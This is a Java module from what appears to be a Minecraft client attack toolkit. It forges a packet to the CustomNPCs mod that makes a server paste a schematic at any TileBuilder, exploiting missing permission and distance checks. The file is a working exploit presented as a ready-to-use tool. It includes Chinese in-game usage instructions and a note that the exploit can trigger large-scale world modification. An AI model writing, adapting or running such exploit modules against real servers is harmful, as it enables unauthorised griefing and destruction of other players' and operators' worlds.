package com.redblue.red.modules.customnpcs;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * CNPC-06: Schematic Build Trigger -- trigger schematic paste at any TileBuilder.
 *
 * Vuln #10 (index 126): SPacketSchematicsTileBuild
 * Wire: writeBlockPos(pos)  -- uses m_130064_ (long-encoded BlockPos)
 *
 * Requires: wand/builder_item/copy_item tool. NO permission check.
 * No distance check. Handler gets TileBuilder at pos, calls SchematicController.build().
 */
public class CNPC06_SchematicBuild implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("customnpcs", "packets");
    private static final int IDX_SCHEMATIC_BUILD = 126;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofAction("fill_pos", "填充当前坐标", () -> {
            Minecraft mc = Minecraft.getInstance();
            if (mc.player != null) {
                BlockPos pos = mc.player.blockPosition();
                staticParams.stream()
                    .filter(p -> p.key.equals("block_pos")).findFirst()
                    .ifPresent(p -> p.set(
                        pos.getX() + "," + pos.getY() + "," + pos.getZ()));
            }
        }),
        ConfigParam.ofString("block_pos", "TileBuilder坐标(x,y,z)", "0,64,0")
    );

    private static List<ConfigParam> staticParams;
    { staticParams = params; }

    @Override public String id() { return "cnpc06_schematic_build"; }
    @Override public String name() { return "远程原理图构建"; }
    @Override public String description() { return "在任意位置触发TileBuilder原理图粘贴"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 手持 wand/builder/copy 物品\n"
            + "2. 输入目标 TileBuilder 方块的坐标\n"
            + "3. 点击执行触发原理图构建\n\n"
            + "[注意]\n"
            + "无权限检查,无距离检查。\n"
            + "目标坐标必须存在 TileBuilder 方块实体。\n"
            + "如果 TileBuilder 加载了大型原理图,可能导致大规模世界修改。";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("customnpcs");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        String posStr = getParam("block_pos")
                .map(ConfigParam::getString).orElse("0,64,0");
        BlockPos pos = parseBlockPos(posStr);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_SCHEMATIC_BUILD);
            buf.writeBlockPos(pos);
        });
    }

    private BlockPos parseBlockPos(String posStr) {
        try {
            String[] parts = posStr.split(",");
            return new BlockPos(
                Integer.parseInt(parts[0].trim()),
                Integer.parseInt(parts[1].trim()),
                Integer.parseInt(parts[2].trim()));
        } catch (Exception e) {
            return new BlockPos(0, 64, 0);
        }
    }
}
